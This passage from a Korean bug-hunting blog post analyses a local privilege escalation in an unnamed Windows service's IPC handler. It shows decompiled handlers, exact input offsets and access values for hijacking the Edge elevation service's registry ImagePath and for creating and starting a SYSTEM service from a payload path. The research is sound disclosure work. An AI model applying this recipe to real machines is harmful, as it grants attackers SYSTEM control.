... (RootKey == HKCR &#xB798;&#xD551; / HKCU TLS &#xCE58;&#xD658; / &#xD14C;&#xC774;&#xBE14; &#xD578;&#xB4E4; &#xB85C;&#xC9C1; &#xB4F1;)</span>  LSTATUS st = SHSetValueW(      RootKey,      SubKey,      ValueName,      Type,      Data,      DataSize  );  DWORD err = GetLastError();  <span class="hljs-comment">// ... (&#xC751;&#xB2F5; Buffer&#xC5D0; st/err &#xB2F4;&#xC544;&#xC11C; &#xBC18;&#xD658;)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>case 0x102C &#xBD84;&#xAE30;&#xB85C; &#xAC00;&#xBA74; &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; SHSetValueW &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xC6D0;&#xD558;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xAC12;&#xC744; &#xC124;&#xC815;&#xD574; &#xC904; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp">offset +<span class="hljs-number">0x0008</span> &#x2192; <span class="hljs-function">HKEY <span class="hljs-title">Root</span> <span class="hljs-params">(&#xC608;: HKEY_LOCAL_MACHINE)</span></span>offset +0x0010 &#x2192; SubKeyoffset +<span class="hljs-number">0x1050</span> &#x2192; ValueNameoffset +<span class="hljs-number">0xA068</span> &#x2192; Type (REG_SZ &#xB4F1;)offset +<span class="hljs-number">0x2090</span> &#x2192; Buffer (&#xC124;&#xC815;&#xD560; &#xAC12;)offset +<span class="hljs-number">0xA064</span> &#x2192; Buffer size</code></pre><p>&#xC785;&#xB825; &#xAD6C;&#xC870;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. </p><pre><code class="hljs cpp"><span class="hljs-keyword">if</span> (RootKey == HKEY_CLASSES_ROOT){  <span class="hljs-comment">// &#xB0B4;&#xBD80; &#xD074;&#xB798;&#xC2A4;&#xB85C; &#xB798;&#xD551;</span>  CClassesRoot ctx;  ctx.h1 = TlsGetValue(...);  ctx.h2 = TlsGetValue(...);  SHSetValueW(ctx.h1 <span class="hljs-keyword">or</span> h2, SubKey, ValueName, Type, Data, Size);}<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (RootKey &amp; <span class="hljs-number">0x80000000</span>)  <span class="hljs-comment">// e.g., HKEY_LOCAL_MACHINE, HKEY_USERS &#xB4F1;</span>{  keyctx = get_handle_from_table(RootKey);  SHSetValueW(keyctx, SubKey, ValueName, Type, Data, Size);}<span class="hljs-keyword">else</span>{  <span class="hljs-comment">// &#xC77C;&#xBC18; HKEY_CURRENT_USER &#xC77C; &#xACBD;&#xC6B0; TLS &#xAE30;&#xBC18; &#xD0A4;&#xB85C; &#xCE58;&#xD658;</span>  <span class="hljs-keyword">if</span> (RootKey == HKEY_CURRENT_USER)    RootKey = TlsGetValue(...);  SHSetValueW(RootKey, SubKey, ValueName, Type, Data, Size);}</code></pre><p>&#xD575;&#xC2EC; &#xCDE8;&#xC57D; &#xB85C;&#xC9C1;&#xC740; &#xC704;&#xC640; &#xAC19;&#xC740;&#xB370;, &#xACB0;&#xAD6D; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC81C;&#xACF5;&#xD55C; &#xC784;&#xC758; HKEY + SubKey + Value + Data&#xAC00; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xADF8;&#xB300;&#xB85C; SHSetValueW &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB85C; &#xB4E4;&#xC5B4;&#xAC11;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xAC19;&#xC740; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xBA74;&#xC11C; Registry&#xC5D0; ImagePath&#xAC00; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xCC3E;&#xC544;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image15.png" alt></p><p>&#xC800;&#xB294; &#xD0C0;&#xAC9F;&#xC73C;&#xB85C; MicrosoftEdgeElevationService &#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xC120;&#xC815;&#xD558;&#xC5EC; &#xC9C4;&#xD589;&#xD558;&#xC600;&#xC2B5;&#xB2C8;&#xB2E4;. Process Monitor &#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;, Edge&#xB97C; &#xCF30;&#xC744; &#xB54C; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC790;&#xB3D9;&#xC73C;&#xB85C; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; Load &#xB418;&#xB294;&#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image16.png" alt></p><p>&#xADF8; &#xD6C4; &#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC5B4;&#xB290; &#xACBD;&#xB85C;&#xC5D0;&#xC11C; &#xC2E4;&#xD589;&#xB418;&#xB294;&#xC9C0;, &#xC11C;&#xBE44;&#xC2A4;&#xC640; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD3B8;&#xC9D1;&#xAE30;&#xC5D0;&#xC11C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image17.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image18.png" alt></p><p>&#xC704; &#xC0AC;&#xC9C4;&#xACFC; &#xAC19;&#xC774; MicroSoftEdgeElevationService &#xC778; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xACE0;, ImagePath &#xAC00; &#x201C;C:\Program Files (x86)\Microsoft\Edge\Application\138.0.3351.77\elevation_service.exe&#x201D; &#xC778; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xC81C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD2B8;&#xB9AC;&#xAC70; &#xD55C; &#xB4A4; &#xB2E4;&#xC2DC; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image19.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image20.png" alt></p><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xC11C;&#xBE44;&#xC2A4;&#xC758; Path&#xC640; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC758; ImagePath&#xAC00; &#xBC14;&#xB010; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!! &#xC774;&#xC81C; MicrosoftEdge&#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xBA74; System &#xAD8C;&#xD55C;&#xC744; &#xAC00;&#xC9C4; cmd&#xAC00; &#xCF1C;&#xC9C0;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xBC88;&#xC5D0;&#xB3C4; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xC548; &#xD574;&#xBCFC; &#xC218; &#xC5C6;&#xACA0;&#xC8E0;?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image21.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image22.png" alt></p><p>Value &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xBA74; ImagePath &#xAC00; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image23.png" alt></p><p>SubKey &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xBA74; &#xC55E;&#xC5D0;&#xC11C; &#xB9D0;&#xD55C; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xACBD;&#xB85C;&#xAC00; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image24.png" alt></p><p>&#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; key&#xB294; HKEY_LOCAL_MACHINE &#xB97C; &#xC758;&#xBBF8;&#xD558;&#xB294; 0x80000002 &#xAC00; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD574;&#xB2F9; &#xAE30;&#xB2A5;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xBA74; &#xC81C;&#xAC00; &#xC6D0;&#xD558;&#xB294; &#xB192;&#xC740; &#xACBD;&#xB85C;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; Image Path&#xB97C; &#xC6D0;&#xD558;&#xB294; &#xAC12;&#xC73C;&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xAC8C; &#xB418;&#xB294; &#xAC83;&#xC774;&#xC8E0;!</p><h2 id="3-Service-&#xAD00;&#xB828;-API&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-LPE"><a href="#3-Service-&#xAD00;&#xB828;-API&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-LPE" class="headerlink" title="3. Service &#xAD00;&#xB828; API&#xB97C; &#xD65C;&#xC6A9;&#xD55C; LPE"></a>3. Service &#xAD00;&#xB828; API&#xB97C; &#xD65C;&#xC6A9;&#xD55C; LPE</h2><hr><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xB9C8;&#xC9C0;&#xB9C9;&#xC73C;&#xB85C; Service &#xAD00;&#xB828; API&#xB97C; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;! &#xC774;&#xBC88;&#xC5D4; 3&#xAC00;&#xC9C0;&#xC758; API&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; LPE&#xAE4C;&#xC9C0; &#xB2EC;&#xC131; &#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, &#xD558;&#xB098;&#xC529; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;?</p><h3 id="3-1-OpenSCManagerW"><a href="#3-1-OpenSCManagerW" class="headerlink" title="3.1 OpenSCManagerW()"></a>3.1 OpenSCManagerW()</h3><pre><code class="hljs cpp"><span class="hljs-function">SC_HANDLE <span class="hljs-title">OpenSCManagerW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR lpMachineName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR lpDatabaseName,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD   dwDesiredAccess</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xBA3C;&#xC800; <code>OpenSCManagerW()</code> &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. &#xB4A4;&#xC5D0; &#xB098;&#xC62C; CreateService&#xB098; StartService&#xB294; &#xB418;&#xAC8C; &#xC9C1;&#xAD00;&#xC801;&#xC73C;&#xB85C; &#xBB34;&#xC2A8; &#xAE30;&#xB2A5;&#xC778;&#xC9C0; &#xC54C; &#xAC83; &#xAC19;&#xC9C0;&#xB9CC;, &#xC774; <code>OpenSCManagerW()</code> API&#xB97C; &#xBA3C;&#xC800; &#xC2E4;&#xD589;&#xD574;&#xC57C;&#xB9CC; &#xD558;&#xAE30; &#xB54C;&#xBB38;&#xC774;&#xC8E0;!</p><p>&#xC11C;&#xBE44;&#xC2A4;&#xB294; &#x2018;SCM &#xB370;&#xC774;&#xD130;&#xBCA0;&#xC774;&#xC2A4;&#x2019;&#xC5D0; &#xB4F1;&#xB85D;&#xB418;&#xB294; &#xAC1D;&#xCCB4;&#xB77C;&#xC11C;, &#xADF8; DB&#xC5D0; &#xB300;&#xD55C; &#xD578;&#xB4E4;(&#xCEE8;&#xD14D;&#xC2A4;&#xD2B8;)&#xC774; &#xBA3C;&#xC800; &#xC788;&#xC5B4;&#xC57C; &#xC774;&#xD6C4; &#xC791;&#xC5C5;(&#xC0DD;&#xC131;/&#xC218;&#xC815;/&#xC2DC;&#xC791;)&#xC744; &#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8; &#xD578;&#xB4E4;&#xC744; &#xC5F4;&#xACE0; &#xBC18;&#xD658;&#xD574;&#xC8FC;&#xB294; &#xAC83;&#xC774; &#xBC14;&#xB85C; &#xC774; API&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x103B</span>:{  <span class="hljs-keyword">const</span> WCHAR *Machine  = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">8</span>);      <span class="hljs-comment">// attacker-controlled (optional)</span>  <span class="hljs-keyword">const</span> WCHAR *Database = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">0x1048</span>); <span class="hljs-comment">// attacker-controlled (optional)</span>  DWORD Access          = *(DWORD *)(input + <span class="hljs-number">0x2088</span>);      <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-comment">// ... (empty string -&gt; NULL &#xCC98;&#xB9AC; &#xB4F1;)</span>  SC_HANDLE hScm = OpenSCManagerW(Machine, Database, Access);  DWORD err = GetLastError();  <span class="hljs-comment">// ... (&#xC751;&#xB2F5;&#xC5D0; hScm/err &#xBC18;&#xD658;)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>case 0x103B &#xBD84;&#xAE30;&#xB97C; &#xD1B5;&#xD574; &#xD574;&#xB2F9; API&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xC5EC; &#xD578;&#xB4E4;&#xC744; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;,</p><ul><li>input + 8 &#x2192; lpMachineName</li><li>input + 0x1048 &#x2192; lpDatabaseName</li><li>input + 0x2088 &#x2192; dwDesiredAccess</li></ul><p>&#xC5EC;&#xAE30;&#xC11C; &#xC911;&#xC694;&#xD55C; &#xAC83;&#xC740; dwDesiredAccess &#xB85C;, SC_MANAGER_ALL_ACCESS(0xF003F) &#xB85C; &#xC124;&#xC815;&#xD574;&#xC918;&#xC57C; &#xD55C;&#xB2E4;&#xB294;&#xAC83;!</p><h3 id="3-2-CreateServiceW"><a href="#3-2-CreateServiceW" class="headerlink" title="3.2 CreateServiceW()"></a>3.2 <strong>CreateServiceW()</strong></h3><pre><code class="hljs cpp"><span class="hljs-function">SC_HANDLE <span class="hljs-title">CreateServiceW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]            SC_HANDLE hSCManager,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            LPCWSTR   lpServiceName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpDisplayName,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwDesiredAccess,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwServiceType,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwStartType,</span></span><span class="hljs-function"><span class="hljs-params">  [in]            DWORD     dwErrorControl,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpBinaryPathName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpLoadOrderGroup,</span></span><span class="hljs-function"><span class="hljs-params">  [out, optional] LPDWORD   lpdwTagId,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpDependencies,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpServiceStartName,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional]  LPCWSTR   lpPassword</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xD578;&#xB4E4;&#xB3C4; &#xC5BB;&#xC5C8;&#xC73C;&#xB2C8;, Service&#xB97C; &#xC0DD;&#xC131;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x103F</span>:{  SC_HANDLE hScm = *(SC_HANDLE *)(input + <span class="hljs-number">8</span>);  <span class="hljs-keyword">const</span> WCHAR *SvcName    = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">16</span>);     <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-keyword">const</span> WCHAR *DispName   = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">4176</span>);   <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-keyword">const</span> WCHAR *BinPath    = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">8352</span>);   <span class="hljs-comment">// attacker-controlled</span>  DWORD DesiredAccess     = *(DWORD *)(input + <span class="hljs-number">0x2090</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD ServiceType       = *(DWORD *)(input + <span class="hljs-number">0x2094</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD StartType         = *(DWORD *)(input + <span class="hljs-number">0x2098</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD ErrorControl      = *(DWORD *)(input + <span class="hljs-number">0x209C</span>);      <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-comment">// ... (Group/Deps/StartName/Password &#xD3EC;&#xC778;&#xD130; &#xC815;&#xB9AC; &#xBC0F; NULL &#xCC98;&#xB9AC;)</span>  SC_HANDLE hSvc = CreateServiceW(      hScm,      SvcName,      DispName,      DesiredAccess,      ServiceType,      StartType,      ErrorControl,      BinPath,      <span class="hljs-comment">/* ... */</span> <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>  );  DWORD err = GetLastError();  <span class="hljs-comment">// ... (&#xC751;&#xB2F5;&#xC5D0; hSvc/err &#xBC18;&#xD658;)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>case 0x103F &#xBD84;&#xAE30;&#xC5D0;&#xC11C; CreateServiceW() &#xB85C; &#xC9C1;&#xC811; &#xC784;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC11C;&#xBE44;&#xC2A4;&#xB85C; &#xB4F1;&#xB85D;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><ul><li>input + 0x08 &#x2192; <code>hSCManager</code><ul><li><code>SC_HANDLE</code> (&#xC774;&#xC804; <code>0x103B</code> &#xD638;&#xCD9C;&#xB85C; &#xC5BB;&#xC740; SCM &#xD578;&#xB4E4;)</li></ul></li><li>input + 0x10 &#x2192; <code>lpServiceName</code><ul><li><code>LPCWSTR</code> &#xC11C;&#xBE44;&#xC2A4; &#xB0B4;&#xBD80; &#xC774;&#xB984; (&#xC608;: L&#x201D;LPE&#x201D;)</li></ul></li><li>input + 0x1050 &#x2192; <code>lpDisplayName</code><ul><li><code>LPCWSTR</code> &#xC0AC;&#xC6A9;&#xC790;&#xC5D0;&#xAC8C; &#xBCF4;&#xC77C; &#xC11C;&#xBE44;&#xC2A4; &#xC774;&#xB984; (&#xC608;: L&#x201D;My Payload Service&#x201D;)</li></ul></li><li>input + 0x2090 &#x2192; <code>dwDesiredAccess</code><ul><li><code>DWORD</code> &#xC811;&#xADFC;&#xAD8C;&#xD55C; &#xD50C;&#xB798;&#xADF8; (&#xC608;: <code>SERVICE_ALL_ACCESS</code> = 0xF01FF)</li></ul></li><li>input + 0x2094 &#x2192; <code>dwServiceType</code><ul><li><code>DWORD</code> &#xC11C;&#xBE44;&#xC2A4; &#xD0C0;&#xC785; (&#xC608;: <code>SERVICE_WIN32_OWN_PROCESS</code> = 0x10)</li></ul></li><li>input + 0x2098 &#x2192; <code>dwStartType</code><ul><li><code>DWORD</code> &#xC2DC;&#xC791; &#xC720;&#xD615; (&#xC608;: <code>SERVICE_DEMAND_START</code> = 0x3)</li></ul></li><li>input + 0x209C &#x2192; <code>dwErrorControl</code><ul><li><code>DWORD</code> &#xC624;&#xB958; &#xC81C;&#xC5B4; (&#xC608;: <code>SERVICE_ERROR_NORMAL</code> = 0x1)</li></ul></li><li>input + 0x20A0 &#x2192; <code>lpBinaryPathName</code><ul><li><code>LPCWSTR</code> &#xC2E4;&#xD589; &#xD30C;&#xC77C; &#xACBD;&#xB85C; (&#xC608;: L&#x201D;C:\Temp\poc.exe&#x201D;)</li></ul></li><li>input + 0x30E0 &#x2192; <code>lpLoadOrderGroup</code><ul><li><code>LPCWSTR</code> &#xB85C;&#xB4DC; &#xC21C;&#xC11C; &#xADF8;&#xB8F9; (&#xC608;: L&#x201D;Base&#x201D;)</li></ul></li><li>input + 0x4120 &#x2192; <code>lpDependencies</code><ul><li><code>LPCWSTR</code> &#xC758;&#xC874; &#xC11C;&#xBE44;&#xC2A4; &#xB9AC;&#xC2A4;&#xD2B8;</li></ul></li><li>input + 0x5160 &#x2192; <code>lpServiceStartName</code><ul><li><code>LPCWSTR</code> &#xB85C;&#xADF8;&#xC628; &#xACC4;&#xC815; (&#xC608;: L&#x201D;NT AUTHORITY\System&#x201D;)</li></ul></li><li>input + 0x61A0 &#x2192; <code>lpPassword</code><ul><li><code>LPCWSTR</code> &#xD574;&#xB2F9; &#xACC4;&#xC815; &#xBE44;&#xBC00;&#xBC88;&#xD638; (&#xC5C6;&#xC73C;&#xBA74; NULL)</li></ul></li></ul><p>&#xD558;&#xC9C0;&#xB9CC; &#xC0DD;&#xC131;&#xB9CC; &#xD55C;&#xB2E4;&#xACE0; &#xD574;&#xC11C; &#xC644;&#xBCBD;&#xD55C; LPE&#xB77C;&#xACE0; &#xD560; &#xC21C; &#xC5C6;&#xACA0;&#xC8E0;? &#xC774;&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xC8FC;&#xB294; API &#xB610;&#xD55C; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="3-3-StartServiceW"><a href="#3-3-StartServiceW" class="headerlink" title="3.3 StartServiceW()"></a>3.3 <strong>StartServiceW()</strong></h3><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">StartServiceW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]           SC_HANDLE hService,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD     dwNumServiceArgs,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR   *lpServiceArgVectors</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x1040</span>:{  SC_HANDLE hSvc = *(SC_HANDLE *)(input + <span class="hljs-number">8</span>);  <span class="hljs-comment">// attacker-controlled (handle from prior call)</span>  BOOL ok = StartServiceW(hSvc, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);  DWORD err = GetLastError();  <span class="hljs-comment">// ... (&#xC751;&#xB2F5; Buffer&#xC5D0; ok/err &#xB2F4;&#xC544;&#xC11C; &#xBC18;&#xD658;)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>&#xC774;&#xC81C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xC11C;&#xBE44;&#xC2A4;&#xB97C; Start &#xC2DC;&#xD0A4;&#xB294; case 0x1040 &#xBD84;&#xAE30;&#xB85C; StartServiceW() &#xB97C; &#xC2E4;&#xD589;&#xC2DC;&#xD0B5;&#xB2C8;&#xB2E4;.</p><ul><li>input + 8 &#x2192; <code>hService</code> (<code>SC_HANDLE</code>)</li><li>dwNumServiceArgs &#x2192; <code>0</code> (&#xACE0;&#xC815;)</li><li>lpServiceArgVectors &#x2192; <code>NULL</code> (&#xACE0;&#xC815;)</li></ul><p>&#xC55E;&#xC11C; CreateServiceW() &#xC758; &#xBC18;&#xD658; &#xAC12;&#xC73C;&#xB85C; &#xBC1B;&#xC740; &#xD578;&#xB4E4;&#xC744; input + 8&#xC5D0; &#xB123;&#xC5B4; &#xC2E4;&#xD589;&#xC2DC;&#xD0A4;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;!</p><p>&#xC774;&#xBC88;&#xC5D4; &#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC73C;&#xB85C; &#xBA3C;&#xC800; &#xD55C; &#xB2E8;&#xACC4; &#xD55C; &#xB2E8;&#xACC4; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image25.png" alt></p><p>&#xBA3C;&#xC800; OpenSCManagerW() &#xD568;&#xC218; &#xBD80;&#xADFC;&#xC5D0; bp&#xB97C; &#xAC78;&#xACE0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image26.png" alt></p><p>dwDesiredAccess &#xBD80;&#xBD84;&#xC5D0; &#xC800;&#xD76C;&#xAC00; &#xC9D1;&#xC5B4;&#xB123;&#xC740; SC_MANAGER_ALL_ACCESS(0xf003f) &#xAC00; &#xB4E4;&#xC5B4;&#xAC04; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;!</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image27.png" alt></p><p>&#xC774;&#xD6C4; &#xCD9C;&#xB825; &#xD654;&#xBA74;&#xC744; &#xBCF4;&#xBA74; hSCM &#xD578;&#xB4E4;&#xC744; &#xC81C;&#xB300;&#xB85C; &#xBC1B;&#xC544;&#xC624;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image28.png" alt></p><p>&#xC774;&#xC81C; CreateServiceW() &#xBD80;&#xADFC;&#xC5D0; bp&#xB97C; &#xAC78;&#xACE0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image29.png" alt></p><p>lpServiceStartName &#xC5D0;&#xB294; System &#xC744; &#xC801;&#xC5B4;&#xC8FC;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image30.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; lpBinaryPathName &#xC5D0; &#xC800;&#xD76C;&#xAC00; &#xC11C;&#xBE44;&#xC2A4;&#xD654; &#xC2DC;&#xD0AC; &#xC545;&#xC131; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xAC00; &#xC368;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image31.png" alt></p><p>&#xC774;&#xD6C4; &#xCD9C;&#xB825; &#xB8E8;&#xD2F4;&#xC744; &#xBCF4;&#xBA74; &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC0DD;&#xC131;&#xC774; &#xB418;&#xACE0;, &#xC11C;&#xBE44;&#xC2A4; &#xD578;&#xB4E4; &#xAC12;&#xB3C4; &#xC5BB;&#xC5B4;&#xC62C; &#xC218; &#xC788;&#xB294; &#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC8E0;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image32.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image33.png" alt></p><p>&#xC11C;&#xBE44;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74; LPE &#xC11C;&#xBE44;&#xC2A4;&#xAC00; &#xC0DD;&#xACBC;&#xACE0;, &#xACBD;&#xB85C;&#xB3C4; &#xC545;&#xC131; &#xD30C;&#xC77C; 